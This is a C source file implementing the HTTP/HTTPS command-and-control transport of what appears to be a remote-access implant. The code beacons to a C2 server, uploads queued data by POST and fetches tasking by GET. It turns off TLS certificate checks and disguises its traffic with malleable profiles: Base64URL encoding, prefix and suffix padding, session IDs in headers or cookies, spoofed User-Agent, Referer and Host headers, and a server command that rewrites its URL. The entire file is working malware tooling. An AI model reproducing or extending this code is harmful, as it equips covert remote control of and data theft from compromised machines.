
/**
 * @brief c2_http.c HTTP transport
 * @file c2_http.c
 */

#include <stdbool.h>
#include <stdlib.h>
#include <string.h>

#include "argv_split.h"
#include "base64.h"
#include "c2.h"
#include "http_client.h"
#include "log.h"
#include "tlv.h"
#include "command_ids.h"

struct http_ctx {
	struct c2_transport *t;
	char *uri;
	struct ev_timer poll_timer;
	char ** headers;
	struct http_request_data data;
	struct http_request_opts opts;
	struct buffer_queue *egress;
	int first_packet;
	int running;
	bool online;
};

static int add_header(struct http_ctx *ctx, const char *header);
static void http_ctx_free(struct http_ctx *ctx);

/*
 * Base64URL encode: uses -_ instead of +/, no padding
 */
static char *b64url_encode(const void *src, size_t src_len, size_t *out_len)
{
	size_t b64_len = ((src_len + 2) / 3) * 4 + 1;
	char *b64 = malloc(b64_len);
	if (!b64) return NULL;

	int len = base64encode(b64, src, src_len);
	/* Convert to URL-safe and strip padding */
	for (int i = 0; i < len; i++) {
		if (b64[i] == '+') b64[i] = '-';
		else if (b64[i] == '/') b64[i] = '_';
	}
	while (len > 0 && b64[len - 1] == '=') len--;
	b64[len] = '\0';
	if (out_len) *out_len = len;
	return b64;
}

static void *c2_encode(const void *data, size_t len, int enc, size_t *out_len)
{
	if (enc == C2_ENCODING_B64) {
		size_t b64_len = ((len + 2) / 3) * 4 + 1;
		char *out = malloc(b64_len);
		if (!out) return NULL;
		int olen = base64encode(out, data, len);
		out[olen] = '\0';
		*out_len = olen;
		return out;
	} else if (enc == C2_ENCODING_B64URL) {
		return b64url_encode(data, len, out_len);
	}
	void *out = malloc(len);
	if (out) {
		memcpy(out, data, len);
		*out_len = len;
	}
	return out;
}

static void *c2_decode(const void *data, size_t len, int enc, size_t *out_len)
{
	if (enc == C2_ENCODING_B64 || enc == C2_ENCODING_B64URL) {
		/* base64decode handles both standard and URL-safe variants */
		size_t max_len = ((len + 3) / 4) * 3 + 1;
		char *out = malloc(max_len);
		if (!out) return NULL;
		/* Need null-terminated string for base64decode */
		char *tmp = malloc(len + 1);
		if (!tmp) { free(out); return NULL; }
		memcpy(tmp, data, len);
		/* Convert URL-safe back to standard for decoder */
		for (size_t i = 0; i < len; i++) {
			if (tmp[i] == '-') tmp[i] = '+';
			else if (tmp[i] == '_') tmp[i] = '/';
		}
		tmp[len] = '\0';
		int olen = base64decode(out, tmp, len);
		free(tmp);
		if (olen < 0) { free(out); return NULL; }
		*out_len = olen;
		return out;
	}
	void *out = malloc(len);
	if (out) {
		memcpy(out, data, len);
		*out_len = len;
	}
	return out;
}

static char *get_uuid_from_uri(const char *uri)
{
	/* Extract UUID from the URI path (last path segment) */
	const char *path = strstr(uri, "://");
	if (path) path = strchr(path + 3, '/');
	if (!path || strlen(path) <= 1) return NULL;

	path++; /* skip leading / */
	const char *end = path + strlen(path);
	if (*(end - 1) == '/') end--;
	const char *last_slash = path;
	for (const char *p = path; p < end; p++) {
		if (*p == '/') last_slash = p + 1;
	}
	if (last_slash >= end) return NULL;

	size_t len = end - last_slash;
	char *uuid = malloc(len + 1);
	if (uuid) {
		memcpy(uuid, last_slash, len);
		uuid[len] = '\0';
	}
	return uuid;
}

static char *build_profile_url(const char *base_uri, struct c2_verb_config *vc, const char *uuid)
{
	if (!vc || !vc->uri) {
		return strdup(base_uri);
	}

	/* Extract scheme://host:port from base URI */
	const char *proto_end = strstr(base_uri, "://");
	if (!proto_end) return strdup(base_uri);
	const char *host_start = proto_end + 3;
	const char *path_start = strchr(host_start, '/');
	size_t base_len = path_start ? (size_t)(path_start - base_uri) : strlen(base_uri);

	const char *profile_uri = vc->uri;
	int needs_slash = (profile_uri[0] != '/');

	/* Calculate max URL length */
	size_t url_len = base_len + 1 + strlen(profile_uri) + 1;
	if (uuid && vc->uuid_get) {
		url_len += 1 + strlen(vc->uuid_get) + 1 + strlen(uuid);
	}

	char *url = malloc(url_len + 1);
	if (!url) return NULL;

	int written = snprintf(url, url_len + 1, "%.*s%s%s",
		(int)base_len, base_uri,
		needs_slash ? "/" : "",
		profile_uri);

	if (uuid && vc->uuid_get) {
		char sep = strchr(url, '?') ? '&' : '?';
		snprintf(url + written, url_len + 1 - written, "%c%s=%s", sep, vc->uuid_get, uuid);
	}

	return url;
}

static void patch_uri(struct http_ctx *ctx, struct buffer_queue *q)
{
	struct tlv_packet *request = tlv_packet_read_buffer_queue(NULL, q);
	if (request) {
		uint32_t command_id;
		tlv_packet_get_u32(request, TLV_TYPE_COMMAND_ID, &command_id);

		const char *new_uri = tlv_packet_get_str(request, TLV_TYPE_TRANS_URL);

		if (command_id == COMMAND_ID_CORE_PATCH_URL && new_uri) {
			char *old_uri = ctx->uri;
			char *split = ctx->uri;
			char *host = strstr(old_uri, "://");
			if (host) {
				split = strchr(host + 3, '/');
			} else {
				split = strrchr(old_uri, '/');
			}
			if (split) {
				*split = '\0';
			}
			if (asprintf(&ctx->uri, "%s%s", ctx->uri, new_uri) > 0) {
				free(old_uri);
			}
		}
	}
	else {
		/**
		 * put packet in ingress? also consider making `core_patch_url` actually core
		 * and expect the transport or get changed on patch request
		**/
	}
}

/*
 * Process a response with C2 profile decoding (prefix/suffix stripping + encoding)
 */
static void process_response_with_profile(struct http_ctx *ctx,
	struct buffer_queue *response_q, struct c2_verb_config *vc)
{
	if (!vc) {
		/* No profile — pass raw data through */
		c2_transport_ingress_queue(ctx->t, response_q);
		return;
	}

	void *raw = NULL;
	ssize_t raw_len = buffer_queue_remove_all(response_q, &raw);
	if (!raw || raw_len <= 0) {
		free(raw);
		return;
	}

	/* Strip prefix/suffix bytes */
	int start = vc->prefix_skip;
	int end = raw_len - vc->suffix_skip;
	if (start >= end || start < 0 || end > (int)raw_len) {
		start = 0;
		end = raw_len;
	}
	size_t stripped_len = end - start;

	/* Decode */
	size_t decoded_len = 0;
	void *decoded = c2_decode((char *)raw + start, stripped_len, vc->enc, &decoded_len);
	free(raw);

	if (decoded && decoded_len > 0) {
		c2_transport_ingress_buf(ctx->t, decoded, decoded_len);
	}
	free(decoded);
}

/*
 * Prepare egress data with C2 profile encoding (encoding + prefix/suffix wrapping)
 */
static void *encode_egress_with_profile(void *data, size_t data_len,
	struct c2_verb_config *vc, size_t *out_len)
{
	if (!vc) {
		*out_len = data_len;
		return data;
	}

	size_t encoded_len = 0;
	void *encoded = c2_encode(data, data_len, vc->enc, &encoded_len);
	free(data);
	if (!encoded) return NULL;

	size_t prefix_len = vc->prefix ? vc->prefix_len : 0;
	size_t suffix_len = vc->suffix ? vc->suffix_len : 0;

	if (prefix_len == 0 && suffix_len == 0) {
		*out_len = encoded_len;
		return encoded;
	}

	size_t total = prefix_len + encoded_len + suffix_len;
	void *wrapped = malloc(total);
	if (!wrapped) { free(encoded); return NULL; }

	char *p = wrapped;
	if (prefix_len > 0) {
		memcpy(p, vc->prefix, prefix_len);
		p += prefix_len;
	}
	memcpy(p, encoded, encoded_len);
	p += encoded_len;
	if (suffix_len > 0) {
		memcpy(p, vc->suffix, suffix_len);
	}
	free(encoded);

	*out_len = total;
	return wrapped;
}

static void http_poll_cb(struct http_conn *conn, void *arg)
{
	struct http_ctx *ctx = arg;

	int code = http_conn_response_code(conn);

	if (code > 0) {
		if(!ctx->online) {
			ctx->first_packet = 1;
			ctx->poll_timer.repeat = 0.1;
			ctx->online = true;
		}
		c2_transport_reachable(ctx->t);
	} else {
		c2_transport_unreachable(ctx->t);
		ctx->online = false;
	}

	bool got_command = false;
	if (code == 200) {
		struct buffer_queue *q = http_conn_response_queue(conn);
		if (ctx->first_packet) {
			patch_uri(ctx, q);
			ctx->first_packet = 0;
			got_command = true;
		} else {
			if (buffer_queue_len(ctx->egress) > 0) {
				got_command = true;
			}
			if (buffer_queue_len(q) > 0) {
				got_command = true;
				struct c2_transport_config *tc = c2_transport_get_config(ctx->t);
				struct c2_verb_config *get_profile = tc ? tc->c2_get : NULL;
				process_response_with_profile(ctx, q, get_profile);
			}
		}
	}
	if(ctx->online) {
		if (got_command) {
			ctx->poll_timer.repeat = 0.1;
		} else {
			if (ctx->poll_timer.repeat < 10.0) {
				ctx->poll_timer.repeat += 0.01;
			}
		}
	}else {
		ctx->poll_timer.repeat = 10;
	}
	if (ctx->running) {
		ev_timer_again(c2_transport_loop(ctx->t), &ctx->poll_timer);
		if(!ctx->online) {
			ctx->poll_timer.repeat = 0;
		}
	}
}

static void add_profile_headers(struct http_ctx *ctx, struct c2_verb_config *vc)
{
	if (!vc) return;

	char *uuid = get_uuid_from_uri(ctx->uri);
	if (!uuid) return;

	if (vc->uuid_header) {
		char *hdr = NULL;
		if (asprintf(&hdr, "%s: %s", vc->uuid_header, uuid) != -1) {
			add_header(ctx, hdr);
			free(hdr);
		}
	}
	if (vc->uuid_cookie) {
		char *cookie = NULL;
		if (asprintf(&cookie, "%s=%s", vc->uuid_cookie, uuid) != -1) {
			free(ctx->data.cookie_list);
			ctx->data.cookie_list = cookie;
		}
	}
	free(uuid);
}

static void http_poll_timer_cb(struct ev_loop *loop, struct ev_timer *w, int revents)
{
	struct http_ctx *ctx = w->data;
	bool sent = false;

	struct c2_transport_config *tc = c2_transport_get_config(ctx->t);
	struct c2_verb_config *post_profile = tc ? tc->c2_post : NULL;
	struct c2_verb_config *get_profile = tc ? tc->c2_get : NULL;

	while (buffer_queue_len(ctx->egress) > 0) {
		ctx->data.content = buffer_queue_remove_msg(ctx->egress, &ctx->data.content_len);

		if (post_profile) {
			size_t encoded_len = 0;
			void *encoded = encode_egress_with_profile(
				ctx->data.content, ctx->data.content_len,
				post_profile, &encoded_len);
			ctx->data.content = encoded;
			ctx->data.content_len = encoded_len;
		}

		char *uuid = get_uuid_from_uri(ctx->uri);
		char *post_url = build_profile_url(ctx->uri, post_profile, uuid);
		free(uuid);
		add_profile_headers(ctx, post_profile);

		http_request(post_url ? post_url : ctx->uri, http_request_post,
				http_poll_cb, ctx, &ctx->data, &ctx->opts);
		free(post_url);
		ctx->data.content_len = 0;
		ctx->data.content = NULL;
		sent = true;
	}

	if (!sent) {
		char *uuid = get_uuid_from_uri(ctx->uri);
		char *get_url = build_profile_url(ctx->uri, get_profile, uuid);
		free(uuid);
		add_profile_headers(ctx, get_profile);

		http_request(get_url ? get_url : ctx->uri, http_request_get,
				http_poll_cb, ctx, &ctx->data, &ctx->opts);
		free(get_url);
	}
}

static void http_ctx_free(struct http_ctx *ctx)
{
	if (ctx) {
		if (ctx->egress) {
			buffer_queue_free(ctx->egress);
		}
		free(ctx->uri);
		for (int i = 0; i < ctx->data.num_headers; i++) {
			free(ctx->headers[i]);
		}
		free(ctx->headers);
		free(ctx->data.ua);
		free(ctx->data.referer);
		free(ctx->data.cookie_list);
		free(ctx);
	}
}

static int add_header(struct http_ctx *ctx, const char *header)
{
	ctx->headers = reallocarray(ctx->headers, ctx->data.num_headers + 1,
			sizeof(char *));
	if (ctx->headers) {
		if ((ctx->headers[ctx->data.num_headers] = strdup(header))) {
			ctx->data.num_headers++;
			return 0;
		}
	}
	return -1;
}

int http_transport_init(struct c2_transport *t)
{
	struct http_ctx *ctx = calloc(1, sizeof *ctx);
	if (ctx == NULL) {
		return -1;
	}

	ctx->t = t;
	ctx->uri = strdup(c2_transport_uri(t));
	if (ctx->uri == NULL) {
		goto err;
	}

	ctx->data.content_type = "application/octet-stream";
	ctx->opts.flags = HTTP_OPTS_SKIP_TLS_VALIDATION;

	add_header(ctx, "Connection: close");

	/* Apply config from TLV config block if available */
	struct c2_transport_config *tc = c2_transport_get_config(t);
	if (tc) {
		if (tc->user_agent) {
			ctx->data.ua = strdup(tc->user_agent);
		}
		if (tc->custom_headers) {
			/* Headers are CRLF-separated */
			char *hdrs = strdup(tc->custom_headers);
			char *line = strtok(hdrs, "\r\n");
			while (line) {
				if (strlen(line) > 0) {
					add_header(ctx, line);
				}
				line = strtok(NULL, "\r\n");
			}
			free(hdrs);
		}
	}

	/* Legacy: parse args after | in URI */
	char *args = strchr(ctx->uri, '|');
	if (args) {
		*args = '\0';
		if (strlen(++args)) {
			size_t argc = 0;
			char **argv = argv_split(args, NULL, &argc);
			for (size_t i = 0; i + 1 < argc && argv[i + 1]; i += 2) {
				if (strcmp(argv[i], "--host") == 0) {
					char *host_header = NULL;
					if (asprintf(&host_header, "Host: %s", argv[i + 1]) != -1) {
						add_header(ctx, host_header);
						free(host_header);
					}
				}
				if (strcmp(argv[i], "--ua") == 0) {
					free(ctx->data.ua);
					ctx->data.ua = strdup(argv[i + 1]);
				}
				if (strcmp(argv[i], "--referer") == 0) {
					ctx->data.referer = strdup(argv[i + 1]);
				}
				if (strcmp(argv[i], "--cookie") == 0) {
					ctx->data.cookie_list = strdup(argv[i + 1]);
				}
				if (strcmp(argv[i], "--header") == 0) {
					add_header(ctx, argv[i + 1]);
				}
			}
		}
	}

	ctx->data.headers = ctx->headers;
	ctx->first_packet = 1;
	ctx->online = false;
	ev_init(&ctx->poll_timer, http_poll_timer_cb);
	ctx->poll_timer.data = ctx;

	ctx->egress = buffer_queue_new();
	if (ctx->egress == NULL) {
		goto err;
	}

	c2_transport_set_ctx(t, ctx);
	return 0;

err:
	http_ctx_free(ctx);
	return -1;
}

void http_transport_start(struct c2_transport *t)
{
	struct http_ctx *ctx = c2_transport_get_ctx(t);
	ctx->running = 1;
	ctx->poll_timer.repeat = 0.1;
	ev_timer_again(c2_transport_loop(t), &ctx->poll_timer);
	ctx->poll_timer.repeat = 0;
}

void http_transport_egress(struct c2_transport *t, struct buffer_queue *egress)
{
	struct http_ctx *ctx = c2_transport_get_ctx(t);
	buffer_queue_move_all(ctx->egress, egress);
}

void http_transport_stop(struct c2_transport *t)
{
	struct http_ctx *ctx = c2_transport_get_ctx(t);
	if (ctx->running) {
		ctx->running = 0;
	}
}

void http_transport_free(struct c2_transport *t)
{
	struct http_ctx *ctx = c2_transport_get_ctx(t);
	buffer_queue_free(ctx->egress);
}

void c2_register_http_transports(struct c2 *c2)
{
	struct c2_transport_cbs http_cbs = {
		.init = http_transport_init,
		.start = http_transport_start,
		.egress = http_transport_egress,
		.stop = http_transport_stop,
		.free = http_transport_free
	};

	c2_register_transport_type(c2, "http", &http_cbs);
	c2_register_transport_type(c2, "https", &http_cbs);
}
